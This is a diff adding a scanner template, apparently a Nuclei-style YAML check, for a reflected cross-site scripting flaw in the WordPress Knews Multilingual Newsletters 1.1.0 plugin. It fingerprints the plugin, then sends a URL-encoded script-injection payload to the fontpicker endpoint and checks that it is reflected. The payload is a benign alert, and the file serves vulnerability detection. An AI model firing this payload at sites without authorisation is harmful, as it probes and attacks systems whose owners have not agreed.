@@ -1,0 +1,38 @@
+id: wp-knews-xss
+brief:
+    title: WordPress Knews Multilingual Newsletters 1.1.0 - Cross-Site Scripting
+    by: daffainfo
+    level: high
+    about: WordPress Knews Multilingual Newsletters 1.1.0 plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context o...
+    label:
+        - wordpress
+        - xss
+        - wp-plugin
+        - vuln
+    score: CVSS:7.2
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/knews/readme.txt'
+      signs:
+        - "on": word
+          has:
+            - Knews Multilingual Newsletters
+          in: body
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/knews/wysiwyg/fontpicker/?ff=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      signs:
+        - "on": word
+          has:
+            - </script><script>alert(document.domain)</script>
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
